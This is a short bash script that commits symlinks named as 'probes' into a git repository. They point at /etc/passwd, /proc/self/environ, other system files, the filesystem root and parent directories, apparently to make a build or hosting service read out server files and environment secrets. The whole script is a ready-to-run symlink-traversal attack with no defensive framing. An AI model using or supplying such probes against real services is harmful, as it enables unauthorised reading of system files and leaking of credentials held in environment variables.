#!/bin/bash
# Run this locally before pushing — git preserves symlinks
mkdir -p _data

ln -sf /etc/passwd symlink-passwd.txt
ln -sf /proc/self/environ symlink-environ.txt
ln -sf /proc/self/cgroup symlink-cgroup.txt
ln -sf /etc/hostname symlink-hostname.txt
ln -sf /etc/resolv.conf symlink-resolv.txt
ln -sf / symlink-root
ln -sf ../.. symlink-parent

# Git config to keep symlinks
git add -A
git commit -m "add symlink probes"
